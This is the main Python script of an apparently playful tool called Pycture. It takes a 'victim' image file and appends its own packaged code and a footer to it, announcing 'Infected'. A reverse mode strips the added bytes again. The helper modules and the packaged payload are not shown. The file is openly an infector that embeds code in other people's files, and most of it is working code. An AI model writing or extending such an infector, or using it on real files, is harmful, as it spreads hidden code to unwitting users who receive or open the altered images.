#!/usr/bin/env python3
"""
Pycture main code
"""

from time import sleep
from pathlib import Path

from utils.parse_argv import parse_argv
from utils.image_io import Image_IO
from utils.footer import create_footer, read_footer
from utils.check import checks
from utils.code_pkg import packaged_code


def pycture() -> None:
    """
    Main function
    """
    args = parse_argv()
    img_io = Image_IO(args.victim_path)
    img_bytes = img_io.read()
    if args.reverse:
        print("No 😡")
        sleep(10)
        print("OK fine 😥")
        footer = read_footer(img_bytes)
        original_bytes = img_bytes[: footer.size]
        img_io.write(original_bytes)
        print("Done 😭")
    else:
        if not checks(img_bytes):
            print(f"{args.victim_path} is already infected 🎉")
            return
        code_bytes = packaged_code(Path(__file__).parent)
        footer = create_footer(img_bytes)
        img_io.write(img_bytes + code_bytes + footer.bytes_)
        print(f"Infected {args.victim_path} 😈")


if __name__ == "__main__":
    pycture()